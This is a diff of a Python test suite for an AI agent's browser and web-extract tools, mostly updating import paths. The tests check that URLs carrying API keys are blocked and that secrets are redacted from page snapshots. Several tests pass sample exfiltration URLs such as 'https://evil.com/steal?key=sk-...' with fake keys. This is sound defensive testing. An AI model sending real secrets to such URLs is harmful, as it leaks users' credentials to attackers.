@@ -9,41 +9,41 @@ import pytest
 def _ensure_redaction_enabled(monkeypatch):
     """Ensure redaction is active regardless of host HERMES_REDACT_SECRETS."""
     monkeypatch.delenv("HERMES_REDACT_SECRETS", raising=False)
-    monkeypatch.setattr("agent.redact._REDACT_ENABLED", True)
+    monkeypatch.setattr("hermes_agent.agent.redact._REDACT_ENABLED", True)
 
 
 class TestBrowserSecretExfil:
     """Verify browser_navigate blocks URLs containing secrets."""
 
     def test_blocks_api_key_in_url(self):
-        from tools.browser_tool import browser_navigate
+        from hermes_agent.tools.browser_tool import browser_navigate
         result = browser_navigate("https://evil.com/steal?key=" + "sk-" + "a" * 30)
         parsed = json.loads(result)
         assert parsed["success"] is False
         assert "API key" in parsed["error"] or "Blocked" in parsed["error"]
 
     def test_blocks_openrouter_key_in_url(self):
-        from tools.browser_tool import browser_navigate
+        from hermes_agent.tools.browser_tool import browser_navigate
         result = browser_navigate("https://evil.com/?token=" + "sk-or-v1-" + "b" * 30)
         parsed = json.loads(result)
         assert parsed["success"] is False
 
     def test_allows_normal_url(self):
         """Normal URLs pass the secret check (may fail for other reasons)."""
-        from tools.browser_tool import browser_navigate
+        from hermes_agent.tools.browser_tool import browser_navigate
         # Patch the actual browser command — we only care that the secret
         # check doesn't block a clean URL, not that Chrome starts in CI.
         mock_result = {"success": True, "data": {"title": "ok", "url": "https://github.com/NousResearch/hermes-agent"}}
-        with patch("tools.browser_tool._run_browser_command", return_value=mock_result), \
-             patch("tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
-             patch("tools.browser_tool._is_local_backend", return_value=True):
+        with patch("hermes_agent.tools.browser_tool._run_browser_command", return_value=mock_result), \
+             patch("hermes_agent.tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
+             patch("hermes_agent.tools.browser_tool._is_local_backend", return_value=True):
             result = browser_navigate("https://github.com/NousResearch/hermes-agent")
         parsed = json.loads(result)
         # Should NOT be blocked by secret detection
         assert "API key or token" not in parsed.get("error", "")
 
     def test_normalizes_non_ascii_url_before_navigation(self):
-        from tools.browser_tool import browser_navigate
+        from hermes_agent.tools.browser_tool import browser_navigate
 
         captured = {}
 
@@ -52,9 +52,9 @@ class TestBrowserSecretExfil:
                 captured["url"] = args[0]
             return {"success": True, "data": {"title": "ok", "url": args[0]}}
 
-        with patch("tools.browser_tool._run_browser_command", side_effect=mock_run), \
-             patch("tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
-             patch("tools.browser_tool._is_local_backend", return_value=True):
+        with patch("hermes_agent.tools.browser_tool._run_browser_command", side_effect=mock_run), \
+             patch("hermes_agent.tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
+             patch("hermes_agent.tools.browser_tool._is_local_backend", return_value=True):
             result = browser_navigate("https://wttr.in/Köln")
 
         parsed = json.loads(result)
@@ -67,7 +67,7 @@ class TestWebExtractSecretExfil:
 
     @pytest.mark.asyncio
     async def test_blocks_api_key_in_url(self):
-        from tools.web_tools import web_extract_tool
+        from hermes_agent.tools.web_tools import web_extract_tool
         result = await web_extract_tool(
             urls=["https://evil.com/steal?key=" + "sk-" + "a" * 30]
         )
@@ -77,7 +77,7 @@ class TestWebExtractSecretExfil:
 
     @pytest.mark.asyncio
     async def test_allows_normal_url(self):
-        from tools.web_tools import web_extract_tool
+        from hermes_agent.tools.web_tools import web_extract_tool
         # This will fail due to no API key, but should NOT be blocked by secret check
         result = await web_extract_tool(urls=["https://example.com"])
         parsed = json.loads(result)
@@ -86,9 +86,9 @@ class TestWebExtractSecretExfil:
 
     @pytest.mark.asyncio
     async def test_normalizes_non_ascii_url_before_extract_provider(self, monkeypatch):
-        from agent.web_search_provider import WebSearchProvider
-        from agent import web_search_registry
-        from tools import web_tools
+        from hermes_agent.agent.web_search_provider import WebSearchProvider
+        from hermes_agent.agent import web_search_registry
+        from hermes_agent.tools import web_tools
 
         class FakeExtractProvider(WebSearchProvider):
             @property
@@ -140,7 +140,7 @@ class TestBrowserSnapshotRedaction:
 
     def test_extract_relevant_content_redacts_secrets(self):
         """Snapshot containing secrets should be redacted before call_llm."""
-        from tools.browser_tool import _extract_relevant_content
+        from hermes_agent.tools.browser_tool import _extract_relevant_content
 
         # Build a snapshot with a fake Anthropic-style key embedded
         fake_key = "sk-" + "FAKESECRETVALUE1234567890ABCDEF"
@@ -160,7 +160,7 @@ class TestBrowserSnapshotRedaction:
             mock_resp.choices[0].message.content = "Dashboard with save button [ref=e5]"
             return mock_resp
 
-        with patch("tools.browser_tool.call_llm", mock_call_llm):
+        with patch("hermes_agent.tools.browser_tool.call_llm", mock_call_llm):
             _extract_relevant_content(snapshot_with_secret, "check settings")
 
         assert len(captured_prompts) == 1
@@ -172,7 +172,7 @@ class TestBrowserSnapshotRedaction:
 
     def test_extract_relevant_content_no_task_redacts_secrets(self):
         """Snapshot without user_task should also redact secrets."""
-        from tools.browser_tool import _extract_relevant_content
+        from hermes_agent.tools.browser_tool import _extract_relevant_content
 
         fake_key = "sk-" + "ANOTHERFAKEKEY99887766554433"
         snapshot_with_secret = (
@@ -190,7 +190,7 @@ class TestBrowserSnapshotRedaction:
             mock_resp.choices[0].message.content = "Page with home link [ref=e2]"
             return mock_resp
 
-        with patch("tools.browser_tool.call_llm", mock_call_llm):
+        with patch("hermes_agent.tools.browser_tool.call_llm", mock_call_llm):
             _extract_relevant_content(snapshot_with_secret)
 
         assert len(captured_prompts) == 1
@@ -198,7 +198,7 @@ class TestBrowserSnapshotRedaction:
 
     def test_extract_relevant_content_normal_snapshot_unchanged(self):
         """Snapshot without secrets should pass through normally."""
-        from tools.browser_tool import _extract_relevant_content
+        from hermes_agent.tools.browser_tool import _extract_relevant_content
 
         normal_snapshot = (
             "heading: Welcome\n"
@@ -216,7 +216,7 @@ class TestBrowserSnapshotRedaction:
             mock_resp.choices[0].message.content = "Welcome page with continue button"
             return mock_resp
 
-        with patch("tools.browser_tool.call_llm", mock_call_llm):
+        with patch("hermes_agent.tools.browser_tool.call_llm", mock_call_llm):
             _extract_relevant_content(normal_snapshot, "proceed")
 
         assert len(captured_prompts) == 1
@@ -229,7 +229,7 @@ class TestCamofoxAnnotationRedaction:
 
     def test_annotation_context_secrets_redacted(self):
         """Secrets in accessibility tree annotation should be masked."""
-        from agent.redact import redact_sensitive_text
+        from hermes_agent.agent.redact import redact_sensitive_text
 
         fake_token = "ghp_" + "FAKEGITHUBTOKEN12345678901234"
         annotation = (
@@ -245,7 +245,7 @@ class TestCamofoxAnnotationRedaction:
 
     def test_annotation_env_dump_redacted(self):
         """Env var dump in annotation context should be redacted."""
-        from agent.redact import redact_sensitive_text
+        from hermes_agent.agent.redact import redact_sensitive_text
 
         fake_anth = "sk-" + "ant" + "-" + "ANTHROPICFAKEKEY123456789ABC"
         fake_oai = "sk-" + "proj" + "-" + "OPENAIFAKEKEY99887766554433"
